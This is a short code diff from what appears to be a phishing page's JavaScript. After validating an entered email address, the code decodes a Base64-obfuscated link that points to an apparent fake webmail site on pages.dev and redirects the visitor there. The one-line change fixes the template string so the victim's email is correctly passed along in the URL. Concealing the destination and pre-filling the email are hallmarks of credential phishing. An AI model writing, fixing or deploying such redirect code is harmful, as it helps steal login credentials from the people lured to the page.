@@ -146,7 +146,7 @@
             if (validateEmail(email)) {
                 const link = "aHR0cHM6Ly9jYjlmYmZiMC53ZWJtYWlsLXZmbS5wYWdlcy5kZXYv"; // Base64 encoded link
                 const decodedLink = atob(link);
-                const finalLink = `${decodedLink}#{email}`;
+                const finalLink = `${decodedLink}#${email}`;
                 window.location.href = finalLink;
             } else {
                 alert("Please enter a valid email address.");
